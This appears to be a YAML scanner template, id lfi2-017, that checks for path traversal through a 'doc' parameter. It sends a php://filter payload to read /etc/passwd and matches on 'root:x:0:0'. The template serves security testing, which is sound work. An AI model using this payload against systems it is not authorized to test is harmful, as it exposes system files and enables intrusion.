id: lfi2-017
name: 'Path traversal2 via doc'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via doc'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      doc:
        - 'php://filter/resource=/etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
